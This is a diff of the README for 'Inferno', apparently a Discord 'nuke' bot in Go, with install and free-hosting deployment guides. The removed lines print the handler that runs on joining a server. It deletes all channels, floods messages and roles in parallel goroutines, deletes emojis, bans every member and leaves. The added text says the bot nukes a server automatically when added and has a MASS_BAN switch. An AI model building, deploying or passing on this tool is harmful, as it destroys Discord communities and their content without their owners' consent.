@@ -18,6 +18,8 @@ There's many variables such as
     BOT_TOKEN: bot's token
     BOT_OWNER_ID: your id
 
+    MASS_BAN: true or false
+
     WEBHOOK_URL: Webhook's URL
     AVATAR_URL: avatar url for webhook
 
@@ -30,113 +32,47 @@ There's many variables such as
 
 }
 </pre>
-All values are have string data type
+All variables have a string data type. Only the MASS_BAN variable has two possible values - true and false. Write them with a lowercase letter.
 
 # Code Structure
-All bot functions are in cogs folder
-<pre>
-    main.go
-    overcharge.go
-    auto.go
-    .env
-    avatar.webp
-    - cogs
-      - channels.go
-      - emoji.go
-      - leave.go
-      - members.go
-      - rename.go
-      - roles.go
-      - webhooks.go
-</pre>
+All bot's functions are in core folder
 
 # main.go & auto.go
-main.go - launches bot and OnGuildCreate handler from auto.go
-<pre>
-    sess.AddHandler(onGuildCreate) - function onGuildCreate is located in auto.go file
-</pre>
+main.go - starts the bot and onGuildCreate handler from auto.go
 <hr>
-auto.go - launches bot functions from cogs folder if bot joined the guild
-<pre>
-func onGuildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
-  var wg sync.WaitGroup
+auto.go - runs bot functions from core folder
+<hr>
 
-	cogs.Logs(s, event)
-	cogs.GuildRename(s, event)
+# sendhttp.go
+This file is located in src/core/requests and helps to send http requests to Discord API easily
 
-	wg.Add(1)
-	go func() {
-		defer wg.Done()
-		channels, _ := s.GuildChannels(event.ID)
-		cogs.DeleteChannels(s, channels, &wg)
-	}()
-	wg.Wait()
+# smooth.go
+This file is located in src/core/requests and helps to avoid rate-limits
 
-	for i := 0; i < 50; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			cogs.TextSpam(s, event, &wg)
-		}()
-	}
-	wg.Wait()
-
-	wg.Add(1)
-	go func() {
-		defer wg.Done()
-		cogs.DeleteRoles(s, event)
-	}()
-	wg.Wait()
-
-	for i := 0; i < 40; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			cogs.RolesSpam(s, event)
-		}()
-	}
-	wg.Wait()
-
-	cogs.EmojiDelete(s, event)
-	cogs.MemberBan(s, event)
-	cogs.BotLeave(s, event)
-}
-</pre>
-
-# cogs folder
-There's located all bot's functions.
-<pre>
-	channels.go: 2 functions (DeleteChannels, TextSpam)
-	emoji.go: 1 function that deletes all emojies from the server
-	leave.go: 1 function that leaves from the server
-	members.go: 1 function that bans all members from the server
-	rename.go 1 function that renames the server 
-	roles.go: 2 functions that deletes and creates roles (DeleteRoles, RolesSpam)
-	webhooks.go: 2 functions that send logs via webhook before nuke bot starts other functions
-	overcharge.go: leaves every server owner write ".overcharge_leave"
-</pre>
+# Nuking process
+This bot nukes the server when you add it. This means that you don't need to write any commands to initialise the nuke.
 
 # Installation guide
 <pre>
-	1. Clone or download repository's source code
+	1. Clone or download the repository source code
 	2. Install golang
-	3. Go to Inferno folder
+	3. Go to src folder
 	4. Change values in .env
-	5. Run go build Inferno && ./Inferno
+	5. Run go build Inferno and then ./Inferno or double-click the executable named Inferno
 </pre>
 
 # Where to host?
-We recommend you to use <a href="https://fl0.com">fl0.com</a>, <a href="https://koyeb.com">koyeb.com</a>, <a href="https://back4app.com">back4app.com</a> or <a href="https://render.com">render.com</a>. They're free and there you can host Inferno and other discord bots. More information about other hostings are <a href="https://github.com/DmitryScaletta/free-heroku-alternatives">here</a>
+We recommend you to use <a href="https://fl0.com">fl0.com</a>, <a href="https://back4app.com">back4app.com</a>, <a href="https://koyeb.com">koyeb.com</a> and <a href="https://render.com">render.com</a>. They're free and there you can host Dynamic and other discord bots. More information about other hostings are <a href="https://github.com/DmitryScaletta/free-heroku-alternatives">here</a>
 
 # Deploy guide
-First of all, copy all source code to your private repository. Then create an account on railway.app via github. Use Dockerfile for quick deployment. Railway.app is one of the best free hosting provider, where you don't need to add http server to your bot for 100% uptime. 
+First of all, copy all source code to your private repository. Then create an account on <a href="https://railway.app">railway.app</a> via github. Use Dockerfile for quick deployment. <a href="https://railway.app">Railway.app</a> is one of the best free hosting provider, where you don't need to add http server to your bot for 100% uptime. 
 
 # Dockerfile example
 <pre>
 # For deployment on railway.app
 FROM golang:latest
 
-WORKDIR /Inferno
+WORKDIR /
 
 COPY . .
 
@@ -149,7 +85,7 @@ CMD [ "./Inferno" ]
 # For deployment on render.com and others
 FROM golang:latest
 
-WORKDIR /Inferno
+WORKDIR /
 
 COPY . .
 
@@ -194,4 +130,3 @@ func getRoot(w http.ResponseWriter, r *http.Request) {
 	io.WriteString(w, "Inferno is at render.com now.. 🚀\n")
 }
 </pre>
-
